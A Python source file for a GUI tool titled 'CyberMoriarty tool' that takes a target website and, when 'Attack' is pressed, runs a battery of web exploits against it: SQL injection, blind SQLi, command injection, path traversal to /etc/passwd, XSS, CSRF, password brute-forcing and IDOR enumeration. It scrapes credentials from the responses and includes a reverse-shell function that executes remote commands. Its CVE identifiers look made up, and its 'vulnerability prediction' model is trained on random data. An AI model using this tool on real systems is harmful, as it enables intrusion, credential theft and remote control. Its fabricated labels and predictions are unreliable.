import requests
from bs4 import BeautifulSoup
from sklearn.ensemble import RandomForestClassifier
import socket
import subprocess
import pandas as pd
import numpy as np
import re
import tkinter as tk
from tkinter import scrolledtext
from tkinter import font

def resolve_ip(target_url):
    try:
        response = requests.get(target_url)
        return response.url.split('/')[2]  # Extracting the IP from the URL
    except Exception as e:
        return str(e)

def identify_vulnerabilities():
    vulnerabilities = [
        {"port": 80, "service": "Brute Force", "product": "CVE-2021-90123"},
        {"port": 80, "service": "Command Injection", "product": "CVE-2021-23456"},
        {"port": 80, "service": "Cross-Site Request Forgery (CSRF)", "product": "CVE-2021-34567"},
        {"port": 80, "service": "File Inclusion", "product": "CVE-2021-56789"},
        {"port": 80, "service": "File Upload", "product": "CVE-2021-23456"},
        {"port": 80, "service": "Insecure CAPTCHA", "product": "CVE-2021-78901"},
        {"port": 80, "service": "SQL Injection", "product": "CVE-2021-12345"},
        {"port": 80, "service": "Blind SQL Injection", "product": "CVE-2021-67890"},
        {"port": 80, "service": "Cross-Site Scripting (XSS)", "product": "CVE-2021-34567"},
        {"port": 80, "service": "Reflected XSS", "product": "CVE-2021-89012"},
        {"port": 80, "service": "Stored XSS", "product": "CVE-2021-23456"},
        {"port": 80, "service": "DOM-based XSS", "product": "CVE-2021-34567"},
        {"port": 80, "service": "Insecure Direct Object References (IDOR)", "product": "CVE-2021-45678"},
    ]
    return vulnerabilities

def extract_features_from_page(page_content):
    soup = BeautifulSoup(page_content, 'html.parser')
    text_length = len(soup.get_text())
    num_scripts = len(soup.find_all('script'))
    num_forms = len(soup.find_all('form'))
    num_inputs = len(soup.find_all('input'))
    return {'text_length': text_length, 'num_scripts': num_scripts, 'num_forms': num_forms, 'num_inputs': num_inputs}

def extract_important_data(page_content, vulnerability):
    if not page_content:
        return {}
    
    data = {}
    if vulnerability["service"] == "Brute Force":
        if "Welcome" in page_content:
            passwords = re.findall(r'Password:\s*(\S+)', page_content)
            data['passwords'] = passwords
    elif vulnerability["service"] == "SQL Injection":
        # Example: Extracting user credentials or sensitive info from SQL Injection response
        credentials = re.findall(r'Username:\s*(\S+)\s*Password:\s*(\S+)', page_content)
        data['credentials'] = credentials
    elif vulnerability["service"] == "Blind SQL Injection":
        # Example: Checking response times or blind SQL injection indications
        data['response_time'] = response.elapsed.total_seconds()
    elif vulnerability["service"] == "Command Injection":
        # Extract command outputs
        output = re.findall(r'bin/(\S+)', page_content)
        data['command_output'] = output
    elif vulnerability["service"] == "Cross-Site Request Forgery (CSRF)":
        if "Account balance updated" in page_content:
            data['csrf_success'] = True
    elif vulnerability["service"] == "Cross-Site Scripting (XSS)":
        alerts = re.findall(r"<script>alert\('XSS'\);</script>", page_content)
        data['xss_alerts'] = len(alerts)
    elif vulnerability["service"] == "Reflected XSS":
        alerts = re.findall(r"<script>alert\('Reflected XSS'\);</script>", page_content)
        data['reflected_xss_alerts'] = len(alerts)
    elif vulnerability["service"] == "Stored XSS":
        alerts = re.findall(r"<script>alert\('Stored XSS'\);</script>", page_content)
        data['stored_xss_alerts'] = len(alerts)
    elif vulnerability["service"] == "DOM-based XSS":
        alerts = re.findall(r"javascript:alert\('DOM-based XSS'\)", page_content)
        data['dom_based_xss_alerts'] = len(alerts)
    elif vulnerability["service"] == "File Inclusion":
        # Extract file content if available
        files = re.findall(r'\b\w+\.(txt|log)\b', page_content)
        data['files'] = files
    elif vulnerability["service"] == "File Upload":
        # Check response for file upload success message
        if "Upload successful" in page_content:
            data['file_upload_success'] = True
    elif vulnerability["service"] == "Insecure CAPTCHA":
        if "CAPTCHA passed" in page_content:
            data['captcha_bypass_success'] = True
    elif vulnerability["service"] == "Insecure Direct Object References (IDOR)":
        user_info = re.findall(r'User Info:\s*(.*)', page_content)
        data['user_info'] = user_info

    return data

def exploit_vulnerability(target_url, vulnerability):
    if vulnerability["service"] == "SQL Injection":
        payload = "1' OR '1'='1"
        vulnerable_url = f"{target_url}?id={payload}&Submit=Submit"
        response = requests.get(vulnerable_url)
        if "user" in response.text:
            return "SQL Injection successful", response.text

    elif vulnerability["service"] == "Blind SQL Injection":
        payload = "1' AND SLEEP(5)-- "
        vulnerable_url = f"{target_url}?id={payload}&Submit=Submit"
        response = requests.get(vulnerable_url)
        if response.elapsed.total_seconds() > 5:
            return "Blind SQL Injection successful", response.text

    elif vulnerability["service"] == "Command Injection":
        payload = "127.0.0.1; ls"
        vulnerable_url = f"{target_url}?ip={payload}&Submit=Submit"
        response = requests.get(vulnerable_url)
        if "bin" in response.text:
            return "Command Injection successful", response.text

    elif vulnerability["service"] == "Cross-Site Request Forgery (CSRF)":
        csrf_payload = {"amount": "1000", "account": "attacker"}
        csrf_headers = {"Referer": target_url}
        response = requests.post(target_url, data=csrf_payload, headers=csrf_headers)
        if response.status_code == 200:
            return "CSRF successful", response.text

    elif vulnerability["service"] == "Cross-Site Scripting (XSS)":
        payload = "<script>alert('XSS');</script>"
        vulnerable_url = f"{target_url}?name={payload}&Submit=Submit"
        response = requests.get(vulnerable_url)
        if payload in response.text:
            return "XSS successful", response.text

    elif vulnerability["service"] == "Reflected XSS":
        payload = "<script>alert('Reflected XSS');</script>"
        vulnerable_url = f"{target_url}?search={payload}"
        response = requests.get(vulnerable_url)
        if payload in response.text:
            return "Reflected XSS successful", response.text

    elif vulnerability["service"] == "Stored XSS":
        payload = "<script>alert('Stored XSS');</script>"
        vulnerable_url = f"{target_url}/comment"
        data = {"comment": payload}
        response = requests.post(vulnerable_url, data=data)
        if payload in response.text:
            return "Stored XSS successful", response.text

    elif vulnerability["service"] == "DOM-based XSS":
        payload = "javascript:alert('DOM-based XSS')"
        vulnerable_url = f"{target_url}?url={payload}"
        response = requests.get(vulnerable_url)
        if payload in response.text:
            return "DOM-based XSS successful", response.text

    elif vulnerability["service"] == "File Inclusion":
        payload = "../../../../etc/passwd"
        vulnerable_url = f"{target_url}?file={payload}&Submit=Submit"
        response = requests.get(vulnerable_url)
        if "root:" in response.text:
            return "File Inclusion successful", response.text

    elif vulnerability["service"] == "File Upload":
        upload_url = f"{target_url}/upload"
        files = {"file": ("test.txt", "This is a test file.")}
        response = requests.post(upload_url, files=files)
        if "Upload successful" in response.text:
            return "File Upload successful", response.text

    elif vulnerability["service"] == "Insecure CAPTCHA":
        payload = {"captcha": "bypass"}
        response = requests.post(target_url, data=payload)
        if "CAPTCHA passed" in response.text:
            return "Insecure CAPTCHA successful", response.text

    elif vulnerability["service"] == "Brute Force":
        login_url = f"{target_url}/login.php"
        for password in ["password", "123456", "admin"]:
            payload = {"username": "admin", "password": password}
            response = requests.post(login_url, data=payload)
            if "Welcome" in response.text:
                return f"Brute Force Authentication successful with password: {password}", response.text
        return "Brute Force Authentication failed", None

    elif vulnerability["service"] == "Insecure Direct Object References (IDOR)":
        for user_id in range(1, 6):
            vulnerable_url = f"{target_url}?user_id={user_id}"
            response = requests.get(vulnerable_url)
            if "user" in response.text:
                return f"IDOR successful with user_id: {user_id}", response.text

    return "Exploit failed", None

def train_model():
    # Generating synthetic training data for the example
    np.random.seed(42)
    text_lengths = np.random.randint(200, 2000, 100)
    num_scripts = np.random.randint(0, 20, 100)
    num_forms = np.random.randint(0, 10, 100)
    num_inputs = np.random.randint(0, 15, 100)
    vulnerabilities = np.random.randint(0, 2, 100)
    
    training_data = pd.DataFrame({
        'text_length': text_lengths,
        'num_scripts': num_scripts,
        'num_forms': num_forms,
        'num_inputs': num_inputs,
        'vulnerability': vulnerabilities
    })
    
    features = training_data.drop('vulnerability', axis=1)
    labels = training_data['vulnerability']
    model = RandomForestClassifier()
    model.fit(features, labels)
    return model

def maintain_access(target_ip, port=4444):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, port))
        while True:
            command = sock.recv(1024).decode()
            if command.lower() == "exit":
                break
            output = subprocess.getoutput(command)
            sock.send(output.encode())
        sock.close()
    except Exception as e:
        print(f"Failed to maintain access: {str(e)}")

class VulnerabilityScannerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("CyberMoriarty tool")
        custom_font = font.Font(family="Helvetica", size=12)

        self.header_app_label = tk.Label(root, text="CyberMoriarty tool", font=(custom_font, 15))
        self.header_app_label.pack()

        self.results_text = scrolledtext.ScrolledText(root, width=100, height=30, font=custom_font)
        self.results_text.pack()

        self.target_url_label = tk.Label(root, text="Enter the target website:", font=custom_font)
        self.target_url_label.pack()

        self.target_url_entry = tk.Entry(root, width=50, font=custom_font)
        self.target_url_entry.pack()

        self.scan_button = tk.Button(root, text="Attack", command=self.start_scan, font=custom_font)
        self.scan_button.pack()


    def start_scan(self):
        target_url = self.target_url_entry.get()
        self.results_text.insert(tk.END, f"Target URL: {target_url}\n")
        resolved_ip = resolve_ip(target_url)
        self.results_text.insert(tk.END, f"Resolved IP: {resolved_ip}\n")

        vulnerabilities = identify_vulnerabilities()
        model = train_model()

        for vulnerability in vulnerabilities:
            self.results_text.insert(tk.END, f"Testing for {vulnerability['service']} on port {vulnerability['port']}\n")
            status, data = exploit_vulnerability(target_url, vulnerability)
            extracted_data = extract_important_data(data, vulnerability) if data else {}
            features = extract_features_from_page(data) if data else {'text_length': 0, 'num_scripts': 0, 'num_forms': 0, 'num_inputs': 0}
            prediction = model.predict(pd.DataFrame([features]))
            self.results_text.insert(tk.END, f"Exploit: {vulnerability['product']}, Port: {vulnerability['port']}, Status: {status}\n")
            self.results_text.insert(tk.END, f"Prediction: {'Vulnerable' if prediction[0] else 'Not Vulnerable'}\n")
            if extracted_data:
                self.results_text.insert(tk.END, f"Extracted Important Data: {extracted_data}\n")
            self.results_text.insert(tk.END, "\n")
        self.results_text.insert(tk.END, "Catch me if you can.\n")

if __name__ == "__main__":
    root = tk.Tk()
    app = VulnerabilityScannerApp(root)
    root.mainloop()



